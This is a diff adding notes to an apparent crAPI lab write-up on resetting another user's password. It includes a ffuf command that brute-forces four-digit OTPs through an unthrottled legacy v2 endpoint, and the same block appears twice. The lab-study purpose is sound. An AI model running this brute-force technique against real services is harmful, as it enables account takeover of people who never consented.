@@ -99,6 +99,29 @@
       <em>==solved==</em></p>
       <h2 id="broken-user-authentication">Broken User Authentication</h2>
       <h3 id="challenge-3-reset-the-password-of-a-different-user">Challenge 3 - Reset the password of a different user</h3>
+      <p><strong>==SOLVED==</strong></p>
+<ul>
+<li><p>Find an email address of another user on crAPI</p>
+</li>
+<li><p>Brute forcing might be the answer. If you face any protection mechanisms, remember to leverage the predictable nature of REST APIs to find more similar API endpoints.</p>
+</li>
+</ul>
+<p><strong>==SOLVED==</strong> HOW:
+V3 applies rate limit, old V2 does not and is accessible
+un removed api endpoint v2 does not rate limit and allows brute forcing for otps</p>
+<p>ffuf -u <a href="http://localhost:8888/identity/api/auth/v2/check-otp">http://localhost:8888/identity/api/auth/v2/check-otp</a> -d &#39;{&quot;email&quot;: &quot;admin@example.com&quot;, &quot;otp&quot;: &quot;FUZZ&quot;, &quot;password&quot;: &quot;Test!1111&quot;}&#39; -X POST -w ~/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -H &quot;Content-Type: application/json&quot; -mc 200,301,401</p>
+<p><strong>==SOLVED==</strong></p>
+<ul>
+<li><p>Find an email address of another user on crAPI</p>
+</li>
+<li><p>Brute forcing might be the answer. If you face any protection mechanisms, remember to leverage the predictable nature of REST APIs to find more similar API endpoints.</p>
+</li>
+</ul>
+<p><strong>==SOLVED==</strong> HOW:
+V3 applies rate limit, old V2 does not and is accessible
+un removed api endpoint v2 does not rate limit and allows brute forcing for otps</p>
+<p>ffuf -u <a href="http://localhost:8888/identity/api/auth/v2/check-otp">http://localhost:8888/identity/api/auth/v2/check-otp</a> -d &#39;{&quot;email&quot;: &quot;admin@example.com&quot;, &quot;otp&quot;: &quot;FUZZ&quot;, &quot;password&quot;: &quot;Test!1111&quot;}&#39; -X POST -w ~/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -H &quot;Content-Type: application/json&quot; -mc 200,301,401</p>
+
       <ul>
       <li><p>Find an email address of another user on crAPI</p>
       </li>
